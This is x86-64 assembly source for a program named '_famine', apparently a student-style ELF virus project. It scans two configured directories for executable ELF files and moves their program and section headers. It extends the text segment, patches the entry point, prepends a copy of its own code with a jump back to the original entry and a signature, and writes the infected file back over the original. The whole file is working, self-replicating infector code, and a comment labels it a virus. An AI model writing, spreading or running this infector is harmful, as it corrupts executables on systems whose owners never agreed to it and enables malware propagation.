%include "header.asm"
[BITS 64]
default rel

%ifdef DEBUG
extern xprintf
%endif

section .text
    global _famine

_famine:
    PUSH
    mov rbp, rsp
    sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
    mov r14, 1

target_dir:
    .f1:
        lea rdi, [rel hook.folder_1]
        jmp open_dir
    .f2:
        mov r14, 0
        lea rdi, [rel hook.folder_2]

open_dir:
    mov rsi, 0                                          ; read only
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0                                          ; open fail
    jle next_dir    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                                        ; offset struct dirent
    mov rdx, 1024
    syscall
    mov r13, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                                        ; clear offset

find_file:
    cmp rbx, r13
    jge next_dir
    lea rsi, [rsp + 256]                                ; struct dirent
    add rsi, rbx                                        ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                                 ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]

target_file:
    ; push qword [rbx]
    mov rax, rdi
    lea rdi, [rsp]
    cmp r14, 1
    je .ff1
    cmp r14, 0
    je .ff2
    .ff1:
        lea rsi, [rel hook.folder_1]
        jmp .path_dir
    .ff2:
        lea rsi, [rel hook.folder_2]
    .path_dir:
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file
%ifdef DEBUG
    lea rdi, [rsp]
    sub rcx, rcx
    sub al, al
    not rcx
    cld
    repne scasb
    not rcx
    dec rcx
    mov [rsp + rcx + 1], byte 0x0                           ; Work because we do not use dirent for now.
    dbgs [rel hook.target], [rsp]
%endif

validate_target:
    lea rdi, [rsp]                                          ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x0                                            ; O_RDONLY
    syscall
    cmp al, 0
    jle next_file
    mov rdi, rax
    mov r15, rax
    mov rsi, rsp
    add rsi, FILE_SIZE + DIRENT
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jne next_file
%ifdef DEBUG
    dbg [rel hook.fz], [rsp + FILE_SIZE + DIRENT + 48]     ; st_size
%endif

map_target:
    push r8                                                 ; save dirent size
    mov rdi, 0x0
    mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48 + 8]      ; filesz
    mov rdx, 0x3                                            ; READ | WRITE
    mov r10, 0x0002                                         ; MAP_PRIVATE
    mov r8, r15                                             ; fd
    mov r9, 0                                               ; offset
    mov rax, 9
    syscall
    mov [rbp - 16], rax                                     ; store mapped file
    pop r8                                                  ; restore dirent size

elf_header:
    mov rsi, [rbp - 16]
    cmp dword [rsi], 0x464c457f                             ; 7fELF
    jne clear
    .exec:
        cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
        je elf_phdr
    ; .dyn:                                                 ; NOT YET ?
        ; cmp word [rsi + Elf64_Ehdr.e_type], ET_DYN
        ; je elf_phdr
    ; if (ehdr->e_machine != EM_X86_64)                     NEED TO ADD THIS PROBABLY.
    jmp clear
%ifdef DEBUG
    mov rsi, [rbp - 16]
    movzx rsi, word [rsi + Elf64_Ehdr.e_type] 
    dbg [rel hook.e_type], rsi
    dbg [rel hook.v_size], FAMINE_SIZE
    mov rsi, [rbp - 16]
%endif

; rsi = e_hdr
elf_phdr:
    mov rdx, rsi
    add rdx, [rdx + Elf64_Ehdr.e_phoff]
    ;rdx = phdr
    PAGE_ALIGN FAMINE_SIZE
    add [rdx + phdr64.p_offset], rcx                        ; phdr[0]
    add [rdx + phdr64.p_offset + 0x38], rcx                 ; phdr[1]
%ifdef DEBUG
    push rdx
    dbg [rel hook.number], [rdx + phdr64.p_offset]
    pop rdx
    push rdx
    dbg [rel hook.number], [rdx + phdr64.p_offset + 0x38]
    pop rdx
%endif

;rdx = phdr[0]
patch_segtext:
    ; pop rsi                                               ; PAGE_ALIGN_UP(FAMINE_SIZE)
    mov rsi, rcx
    mov rax, [rbp - 16]
    mov rcx, [rax + Elf64_Ehdr.e_entry]
    mov [rbp - 30], rcx                                     ; save entry point
    ; push rcx
    xor rcx, rcx
    mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
    xor rax, rax
    .loop:
        cmp cx, 0
        je patch_hdr
        sub cx, 1
    .found:                                                 ; if text found
        cmp al, 1
        jne .compare
        add [rdx + phdr64.p_offset], rsi
    .compare:
        cmp dword [rdx + phdr64.p_type], PT_LOAD
        jne .keep
        cmp dword [rdx + phdr64.p_flags], 0x5
        jne .keep
        sub [rdx + phdr64.p_vaddr], rsi
        mov rdi, [rbp - 16]
        mov r8, [rdx + phdr64.p_vaddr]
        mov [rdi + Elf64_Ehdr.e_entry], r8
        sub [rdx + phdr64.p_paddr], rsi
        add [rdx + phdr64.p_filesz], rsi
        add [rdx + phdr64.p_memsz], rsi
        mov al, 1
    .keep:
        add rdx, 0x38                                       ; next phdr
        jmp .loop

patch_hdr:
    test al, al                                             ; no text found
    je clear
    add qword [rdi + Elf64_Ehdr.e_entry], 0x40              ; new entry  + sizeof(elf_hdr)

patch_shdr:
    mov rax, [rbp - 16]                                     ;EHDR
    xor rcx, rcx                                            ;0 not needed probably
    mov cx, word [rax + Elf64_Ehdr.e_shnum]                 ;n sections
    add rax, [rax + Elf64_Ehdr.e_shoff]                     ;sections[0]
    .loop:
        cmp cx, 0
        je .ehdr
        sub cx, 1
        add [rax + shdr64.sh_offset], rsi
        add rax, 0x40
        jmp .loop
    .ehdr:
        mov rax, [rbp - 16]
        add [rax + Elf64_Ehdr.e_shoff], rsi
        add [rax + Elf64_Ehdr.e_phoff], rsi

mimic:
    lea rdi, [rel hook.TMP]
    mov rsi, 577                                                   ; O_CREAT | O_WRONLY | O_TRUNC
    mov rdx, [rsp + FILE_SIZE + DIRENT + MAPPED_FILE + 16]         ; st_mode
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl clear
    mov r8, rax
;write header
    write r8, [rbp - 16], 64                                        ; maybe change
;write viruses
    write_rel r8, [rel _famine], FAMINE_SIZE
;write opcode to jump to actualy entry
    mov [rbp - 32], word 0xb848                                     ; mov rax
    mov [rbp - 22], word 0xe0ff                                     ; jmp rax
    write_rel r8, [rbp - 32], 0xc
    write_rel r8, [rel hook.folder_1], 11
    write_rel r8, [rel hook.folder_2], 12
    write_rel r8, [rel hook.TMP], 9
    write_rel r8, [rel hook.sig], 38
; write padding
    PAGE_ALIGN FAMINE_SIZE
    sub rcx, FAMINE_SIZE
    sub rcx, 44                                                     ; jmp entry + vars
    sub rcx, 38
    mov r9, rcx
    .loop:
        cmp r9, 0
        je .keep
        mov rdi, r8
        lea rsi, [rel hook.null]
        mov rdx, 1
        mov rax, SYS_WRITE
        syscall
        sub r9, 1
        jmp .loop
; write rest of file
    .keep:
        mov rdi, r8
        mov rax, [rbp - 16]
        add rax, 0x40
        mov rsi, rax
        mov rdx, [rsp + FILE_SIZE + DIRENT + 48]
        sub rdx, 0x40
        mov rax, SYS_WRITE
        syscall

rename:
    lea rdi, [rel hook.TMP]
    lea rsi, [rsp]
    mov rax, SYS_RENAME
    syscall

clear:
    mov rdi, [rbp - 16]
    mov rsi, [rsp + FILE_SIZE + DIRENT + 48]
    mov rax, SYS_MUNMAP                           
    syscall
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall                                                 
next_file:
    ; maybe RBX not valid anymore aswell.
    mov rcx, FILE_SIZE
    memset [rsp], rcx                                       ; FILESIZE memset
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

next_dir:
    mov rcx, 1024
    memset [rsp + 256], rcx                                ; dirent memset
    .next:
        cmp r14, 1
        jge target_dir.f2

clean:
    add rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
    POP

_v_stop:                                                   ; End of virus
    mov rax, SYS_EXIT 
    mov rdi, 0
    syscall

    ; mov rsi, [rbp - 16]
    ; mov rax, qword [rsi + Elf64_Ehdr.e_entry]
    ; jmp rax

hook:
    .folder_1:
        db FOLDER_1, 0
    .folder_2:
        db FOLDER_2, 0
    .TMP:
        db TMP, 0
    .sig:
        db SIGNATURE, 0
    .null:
        db 0
%ifdef DEBUG
    .newline:
        db 0xa, 0
    .fz:
        db "Filesize : 0x%x", 0xa, 0
    .target:
        db "Target_file : %s", 0xa, 0
    .e_type:
        db "e_type : 0x%x", 0xa, 0
    .v_size:
        db "v_size : 0x%x", 0xa, 0
    .string:
        db "%s", 0xa, 0
    .number:
        db "0x%x", 0xa, 0
%endif
_end:
